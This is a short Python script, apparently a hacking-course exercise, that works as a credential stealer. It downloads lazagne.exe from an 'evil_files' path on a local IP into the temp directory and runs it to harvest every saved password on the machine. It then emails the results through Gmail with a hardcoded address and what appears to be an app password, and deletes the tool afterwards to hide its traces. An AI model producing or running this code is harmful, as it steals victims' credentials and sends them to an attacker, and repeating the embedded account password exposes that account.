#!/usr/bin/env python3

import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    """
    Cross-platform to download
    :param url:  where to download from
    """
    get_response = requests.get(url)
    # print(get_response.content)
    file_name =  url.split("/")[-1]
    with open(file_name, "wb") as out_file: # We create a binary file with wrtite permission and we'll call out_file in the code
        out_file.write(get_response.content)

def send_mail(email, password, message):
    """
    Cross-platform to send an email
    :param email: destinatary
    :param password: detinatarie's email password
    :param message: email content
    """
    server = smtplib.SMTP("smtp.gmail.com", port=587) # We create an instance for an SMTP server and we'll use goolge's SMTP server, that works on pot 587
    server.starttls() # Then we start a TLS connection using the server that we've just created
    server.login(email, password) # Now we must log in to our email
    server.sendmail(email, email, message) # The arguments to send the email are: 1set From, 2nd To and 3rd Content of the email
    server.quit() # Finally we close the server

# First we move to the directory in which we want to download lazagne, which will be temp
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.64.128/evil_files/lazagne.exe")
command = "lazagne.exe all"
result = subprocess.check_output(command, shell=True) # Executes a command and returns its result
send_mail("mituconservata@gmail.com", "oryswcbzcubeplkd", result)
# We must remove the pass recovery program after it has been used
os. remove("lazagne.exe")
